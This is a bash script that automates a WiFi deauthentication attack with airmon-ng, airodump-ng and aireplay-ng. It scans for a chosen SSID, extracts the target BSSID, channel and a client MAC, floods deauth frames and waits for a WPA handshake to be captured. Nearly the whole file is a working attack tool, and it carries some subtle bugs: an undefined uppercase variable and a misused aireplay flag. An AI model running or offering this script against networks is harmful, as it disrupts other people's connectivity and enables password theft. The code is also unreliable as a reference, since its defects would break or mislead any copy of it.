#!/bin/bash

# Function to clean up background processes
cleanup() {
    pkill airodump-ng
    echo "Cleanup completed"
    echo "Starting NetworkManager"
    sudo systemctl start NetworkManager
}
trap cleanup EXIT

echo "Starting monitor mode"
sudo airmon-ng check kill
sudo airmon-ng start wlan1

# Ask for SSID
echo -n "Enter the SSID: "
read ssid

# Run airodump-ng to scan for the SSID
echo "Scanning for SSID: $ssid"
sudo airodump-ng wlan1 -w airodump_output --write-interval 5 -o csv &  # Start airodump-ng
PID=$!

echo "Waiting for 15 seconds"
# Give it some time to capture data
sleep 15

echo "Scanning complete"
# Terminate airodump-ng
sudo kill -TERM $PID

# Extract BSSID and Channel from the CSV file
csv_file="airodump_output-01.csv"

extract_bssid_and_channel() {
    local section_header="BSSID"
    local ssid="$1"
    local csv_file="$2"

    # Find the section header and get the corresponding BSSID and Channel columns
    section_start=$(awk -F ',' -v header="$section_header" '$1 == header {print NR}' "$csv_file")
    
    # Check if section_start is not empty and non-zero
    if [[ -n "$section_start" && "$section_start" -gt 0 ]]; then
        # Get the headers from the section start
        headers=$(awk -F ',' -v section_start="$section_start" 'NR == section_start {print}' "$csv_file")

        # Find the column numbers for BSSID and Channel based on headers
        bssid_column=$(echo "$headers" | awk -F ',' '{for(i=1; i<=NF; i++) if($i=="BSSID") print i}')
        channel_column=$(echo "$headers" | awk -F ',' '{for(i=1; i<=NF; i++) if($i=="Channel") print i}')

        # Extract BSSID and Channel for the specified SSID
        bssid=$(awk -F ',' -v section_start="$section_start" -v ssid="$ssid" -v bssid_col="$bssid_column" -v channel_col="$channel_column" \
            'NR > section_start && $14 == ssid {print $bssid_col; exit}' "$csv_file")
        channel=$(awk -F ',' -v section_start="$section_start" -v ssid="$ssid" -v bssid_col="$bssid_column" -v channel_col="$channel_column" \
            'NR > section_start && $14 == ssid {print $channel_col; exit}' "$csv_file")

        # Print the extracted values for verification
        echo "BSSID: $bssid"
        echo "Channel: $channel"

        # Return BSSID and Channel values (optional, depending on how you plan to use the function)
        echo "$bssid"
        echo "$channel"
    else
        echo "Section header not found: $section_header"
    fi
}

echo "Extracting BSSID and Channel from CSV file"
# Example: Call the function with the appropriate section header
extract_bssid_and_channel "$ssid" "$csv_file"

sleep 2

echo "Found BSSID: $bssid, Channel: $channel"

extract_station() {
    local section_header="Station MAC"
    local bssid="$1"
    local csv_file="$2"

    # Find the section header and get the corresponding Station MAC column
    section_start=$(awk -F ',' -v header="$section_header" '$1 == header {print NR}' "$csv_file")
    
    # Check if section_start is not empty and non-zero
    if [[ -n "$section_start" && "$section_start" -gt 0 ]]; then
        # Get the headers from the section start
        headers=$(awk -F ',' -v section_start="$section_start" 'NR == section_start {print}' "$csv_file")

        # Find the column number for Station MAC based on headers
        station_column=$(echo "$headers" | awk -F ',' '{for(i=1; i<=NF; i++) if($i=="Station MAC") print i}')

        # Extract Station MAC for the specified BSSID
        station=$(awk -F ',' -v section_start="$section_start" -v bssid="$bssid" -v station_col="$station_column" \
            'NR > section_start && $6 == bssid {print $station_col; exit}' "$csv_file")

        # Print the extracted value for verification
        echo "Station MAC: $station"

        # Return Station MAC value (optional, depending on how you plan to use the function)
        echo "$station"
    else
        echo "Section header not found: $section_header"
    fi
}

echo "Scanning for Station MAC"
# sudo airodump-ng --bssid $bssid --channel $channel -w $ssid wlan1 -w airodump_output_second --write-interval 5 -o csv &
sudo airodump-ng --bssid "$bssid" --channel "$channel" -w "$ssid" wlan1 -w airodump_output_second --write-interval 5 -o csv > ./airodump_output.log &
PID=$!

# Give it some time to capture data
sleep 2

# Extract BSSID and Channel from the CSV file
csv_file="airodump_output_second-01.csv"

echo "Extracting Station MAC"
extract_station "$bssid" "$csv_file"

sleep 2

echo "Sending deauth attack"
# Run aireplay-ng for deauth attack
sudo aireplay-ng --deauth 20 -b $BSSID -a $station wlan1 &
PID2=$!

# Function to monitor output for "WPA Handshake:"
monitor_output() {
    local log_file="$1"

    # Monitor the log file for "WPA Handshake:"
    tail -f "$log_file" | while IFS= read -r line; do
        if [[ "$line" == *"WPA Handshake:"* ]]; then
            echo "WPA Handshake captured!"
            sudo kill -TERM $PID
            sudo kill -TERM $PID2
            # Optionally, you can add further actions here when "WPA Handshake:" is detected
        else
            echo "Waiting for captured WPA Handshake..."
        fi
    done
}

echo "Monitoring output"
# Call the function to monitor the output log file
monitor_output "airodump_output.log"

# Cleanup
cleanup
